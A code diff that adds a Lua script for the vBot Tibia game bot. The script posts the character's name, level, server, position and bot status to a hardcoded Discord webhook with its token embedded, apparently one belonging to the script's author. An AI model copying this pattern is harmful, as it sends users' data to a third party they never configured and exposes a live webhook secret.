+onPlayerHealthChange(function(healthPercent)
+  standByItems = false
+  standBySpells = false
+end)
+
+onManaChange(function(player, mana, maxMana, oldMana, oldMaxMana)
+  standByItems = false
+  standBySpells = false
+end)
+
+--[[
+    Discord Webhook Automatico para vBot OTC Tibia
+    ==============================================
+    
+    Proposito: Enviar notificaciones automaticas del estado del personaje al Discord
+    Ultima modificacion: 2024-12-19
+    Autor: vBot Team
+    
+    Funciones AUTOMATICAS:
+    - Estado periodico (cada 5 minutos)
+    - Subida de nivel (deteccion automatica)
+    - Muerte (deteccion automatica)
+]]
+
+-- Discord Webhook
+-- Configuraciones y constantes
+local Config = {
+    webhook = "https://discord.com/api/webhooks/1402532878340067369/jZjwXMagpK7Wk7969QoHUUsIJ70gO-qviOATh-n5Eoekdu9bikoAtjQOeJeZ4BgJBDqc",
+    defaultUsername = "vBot Status",
+    embedColorDefault = 10038562, -- rojo
+    embedFooterText = "UnderbotStatus by Underbot Scripts | discord.gg/EUXd8Fsmzk",
+    cooldowns = {
+        status = 300, -- segundos para cooldown de status (5 min)
+        death = 180   -- segundos para cooldown de muerte (3 min)
+    }
+}
+
+-- Estado del sistema y caches
+local State = {
+    discordTimes = {},
+    lastLevel = 0,
+    lastHP = 100,
+    isDead = false,
+    levelStartTime = 0,
+    levelHistory = {},
+    recentAttackers = {},
+    serverLogBuffer = {},
+    systemInitialized = false,
+}
+
+-- Utilidades generales
+local Utils = {}
+
+function Utils.getCurrentTime()
+    local time = os.date("*t")
+    return string.format("%02d:%02d:%02d", time.hour, time.min, time.sec)
+end
+
+function Utils.formatPosition(pos)
+    if not pos then return "Desconocida" end
+    return string.format("X: %d, Y: %d, Z: %d", pos.x, pos.y, pos.z)
+end
+
+function Utils.formatTime(seconds)
+    if seconds < 60 then
+        return string.format("%ds", seconds)
+    elseif seconds < 3600 then
+        local minutes = math.floor(seconds / 60)
+        local secs = seconds % 60
+        return string.format("%dm %ds", minutes, secs)
+    else
+        local hours = math.floor(seconds / 3600)
+        local minutes = math.floor((seconds % 3600) / 60)
+        return string.format("%dh %dm", hours, minutes)
+    end
+end
+
+function Utils.getServerInfo()
+    local worldName = g_game.getWorldName()
+    return worldName or "Desconocido"
+end
+
+function Utils.getStaminaInfo()
+    local stamina = g_game.getLocalPlayer():getStamina()
+    if stamina then
+        local hours = math.floor(stamina / 60)
+        local minutes = stamina % 60
+        if hours == 0 then
+            return string.format("%dm", minutes)
+        else
+            return string.format("%dh %dm", hours, minutes)
+        end
+    end
+    return "N/A"
+end
+
+-- Calculos para niveles
+local LevelTracker = {}
+
+function LevelTracker.calculateAverageLevelTime()
+    if #State.levelHistory == 0 then return 0 end
+    local totalTime = 0
+    for _, entry in ipairs(State.levelHistory) do
+        totalTime = totalTime + entry.time
+    end
+    return math.floor(totalTime / #State.levelHistory)
+end
+
+function LevelTracker.recordLevelUp(currentLevel)
+    local currentTime = os.time()
+    local timeToLevel = currentTime - State.levelStartTime
+    table.insert(State.levelHistory, {level = State.lastLevel, time = timeToLevel})
+    if #State.levelHistory > 5 then
+        table.remove(State.levelHistory, 1)
+    end
+    State.levelStartTime = currentTime
+    State.lastLevel = currentLevel
+    return timeToLevel
+end
+
+-- Manejador del webhook Discord
+local DiscordWebhook = {}
+
+function DiscordWebhook.onHTTPResult(data, err)
+    if err then
+        print("Discord Webhook Error: " .. err)
+    else
+        print("Discord Webhook: Mensaje enviado con exito!")
+    end
+end
+
+function DiscordWebhook.send(data)
+    local id = data.id
+    if id then
+        local dTime = State.discordTimes[id]
+        if dTime and os.time() < dTime then
+            return
+        end
+        State.discordTimes[id] = os.time() + (data.delayed or 10)
+    end
+
+    local messageWithTime = data.message
+    if not messageWithTime:find("Horario:") then
+        messageWithTime = messageWithTime .. " | Horario: " .. Utils.getCurrentTime()
+    end
+
+    local embed = {
+        title = "**" .. data.title .. "**",
+        color = data.color or Config.embedColorDefault,
+        footer = { text = Config.embedFooterText },
+        fields = {
+            { name = "Nombre:", value = data.name },
+            { name = "Mensaje", value = messageWithTime },
+        }
+    }
+
+    local payload = {
+        username = Config.defaultUsername,
+        embeds = { embed }
+    }
+
+    HTTP.postJSON(Config.webhook, payload, DiscordWebhook.onHTTPResult)
+end
+
+-- Macro 1: Estado periódico
+local function periodicStatus()
+    local player = g_game.getLocalPlayer()
+    if not player then return end
+
+    local cavebotStatus = CaveBot.isOn() and "Activo" or "Inactivo"
+    local targetStatus = TargetBot.isOn() and "Activo" or "Inactivo"
+    local pzStatus = isInPz() and "En PZ" or "Fuera de PZ"
+
+    local avgLevelTime = "N/A"
+    if #State.levelHistory > 0 then
+        avgLevelTime = Utils.formatTime(LevelTracker.calculateAverageLevelTime())
+    end
+
+    local data = {
+        title = "Estado del Personaje",
+        name = player:getName(),
+        message = string.format(
+            "Informacion General:\nNivel: %d\nServidor: %s\nPosicion: %s\nResistencia: %s\n\nEstado de Bots:\nCaveBot: %s\nTargetBot: %s\nPZ: %s\n\nEstadisticas:\nTiempo promedio nivel: %s",
+            player:getLevel(),
+            Utils.getServerInfo(),
+            Utils.formatPosition(player:getPosition()),
+            Utils.getStaminaInfo(),
+            cavebotStatus,
+            targetStatus,
+            pzStatus,
+            avgLevelTime
+        ),
+        id = "status",
+        delayed = Config.cooldowns.status,
+        color = 0x0099FF -- Azul
+    }
+    DiscordWebhook.send(data)
+end
+
+-- Macro 2: Detección subida de nivel
+local function detectLevelUp()
+    local player = g_game.getLocalPlayer()
+    if not player then return end
+
+    local currentLevel = player:getLevel()
+
+    if currentLevel > State.lastLevel and State.lastLevel > 0 then
+        local timeToLevel = LevelTracker.recordLevelUp(currentLevel)
+        local timeToLevelFormatted = Utils.formatTime(timeToLevel)
+
+        local nextLevelEstimate = ""
+        if #State.levelHistory > 0 then
+            local avgTime = LevelTracker.calculateAverageLevelTime()
+            nextLevelEstimate = " | Proximo nivel estimado: " .. Utils.formatTime(avgTime)
+        end
+
+        local data = {
+            title = "Subida de Nivel!",
+            name = player:getName(),
+            message = string.format(
+                "Felicidades! Llegaste al nivel %d!\n\nDetalles:\nServidor: %s\nTiempo para nivel: %s%s",
+                currentLevel, Utils.getServerInfo(), timeToLevelFormatted, nextLevelEstimate
+            ),
+            id = "level_up",
+            delayed = 0,
+            color = 0x00FF00 -- Verde
+        }
+        DiscordWebhook.send(data)
+    end
+
+    State.lastLevel = currentLevel
+end
+
+-- Manejador del server log y atacantes recientes
+local function onServerLog(mode, text)
+    if mode == 22 then -- Server log
+        print("DEBUG Server Log: " .. text)
+
+        table.insert(State.serverLogBuffer, text)
+        if #State.serverLogBuffer > 10 then
+            table.remove(State.serverLogBuffer, 1)
+        end
+
+        local damage, attackerName = text:match("You lose (%d+) hitpoints due to an attack by ([^.]+)")
+        if attackerName then
+            print("DEBUG: Capturado ataque - Dano: " .. damage .. " | Atacante: " .. attackerName)
+            table.insert(State.recentAttackers, {name = attackerName, time = os.time(), damage = tonumber(damage)})
+
+            local currentTime = os.time()
+            for i = #State.recentAttackers, 1, -1 do
+                if currentTime - State.recentAttackers[i].time > 5 then
+                    table.remove(State.recentAttackers, i)
+                end
+            end
+
+            print("DEBUG: Total atacantes recientes: " .. #State.recentAttackers)
+        end
+    end
+end
+
+-- Macro 3: Detección de muerte
+local function detectDeath()
+    local player = g_game.getLocalPlayer()
+    if not player then return end
+
+    local currentHP = player:getHealthPercent()
+
+    if currentHP == 0 and not State.isDead then
+        State.isDead = true
+
+        local deathCause = "Desconocida"
+
+        print("DEBUG: Muerte detectada! Total atacantes recientes: " .. #State.recentAttackers)
+        print("DEBUG: Ultimas 10 lineas del server log:")
+        for i, line in ipairs(State.serverLogBuffer) do
+            print("DEBUG: " .. i .. ": " .. line)
+        end
+
+        local lastDamages = {}
+        for i = #State.serverLogBuffer, 1, -1 do
+            local line = State.serverLogBuffer[i]
+            local damage, attackerName = line:match("You lose (%d+) hitpoints due to an attack by ([^.]+)")
+            if attackerName then
+                table.insert(lastDamages, {damage = tonumber(damage), attacker = attackerName})
+            end
+        end
+
+        if #lastDamages > 0 then
+            local lastDamage = lastDamages[1]
+            deathCause = lastDamage.attacker
+
+            if #lastDamages > 1 then
+                deathCause = lastDamage.attacker .. " (ultimo dano)"
+            end
+        else
+            local nearbyCreatures = {}
+            for _, creature in ipairs(getSpectators()) do
+                if (creature:isMonster() or creature:isPlayer()) and creature ~= player and getDistanceBetween(player:getPosition(), creature:getPosition()) <= 3 then
+                    table.insert(nearbyCreatures, creature:getName())
+                end
+            end
+
+            if #nearbyCreatures == 1 then
+                deathCause = nearbyCreatures[1]
+            elseif #nearbyCreatures > 1 then
+                deathCause = nearbyCreatures[1] .. " (+" .. (#nearbyCreatures - 1) .. " otros)"
+            end
+        end
+
+        local data = {
+            title = "Personaje Muerto!",
+            name = player:getName(),
+            message = string.format(
+                "Personaje muerto!\n\nInformacion:\nNivel: %d\nServidor: %s\nPosicion: %s\nMuerto por: %s",
+                player:getLevel(),
+                Utils.getServerInfo(),
+                Utils.formatPosition(player:getPosition()),
+                deathCause
+            ),
+            id = "death",
+            delayed = Config.cooldowns.death,
+            color = 0xFF0000 -- Rojo
+        }
+        DiscordWebhook.send(data)
+    end
+
+    if currentHP > 0 and State.isDead then
+        State.isDead = false
+        State.recentAttackers = {}
+    end
+
+    State.lastHP = currentHP
+end
+
+-- Macro 4: Inicialización del sistema
+local function initializeSystem()
+    local player = g_game.getLocalPlayer()
+    if not player then return end
+
+    if State.systemInitialized then return end
+
+    State.lastLevel = player:getLevel()
+    State.levelStartTime = os.time()
+
+    local data = {
+        title = "Sistema Iniciado",
+        name = player:getName(),
+        message = string.format(
+            "Sistema UnderbotStatus iniciado!\n\nInformacion:\nNivel: %d\nServidor: %s\nSistema automatico activo!",
+            player:getLevel(), Utils.getServerInfo()
+        ),
+        id = "init",
+        delayed = 0,
+        color = 0x0099FF -- Azul
+    }
+    DiscordWebhook.send(data)
+
+    State.systemInitialized = true
+end
+
+-- Registrar callback del server log
+onTextMessage(onServerLog)
+
+-- Registrar macros periódicos
+macro(300000, periodicStatus)  -- cada 3 minutos
+macro(1000, detectLevelUp)     -- cada 1 segundo
+macro(1000, detectDeath)       -- cada 1 segundo
+macro(5000, initializeSystem)  -- despues de 5 segundos
+
+-- UI informativa
+-- UI.Separator()
+-- UI.Label("UnderbotStatus Discord ACTIVADO")
+-- UI.Separator()
+
+print("UnderbotStatus Discord: Sistema activo!")
 end)
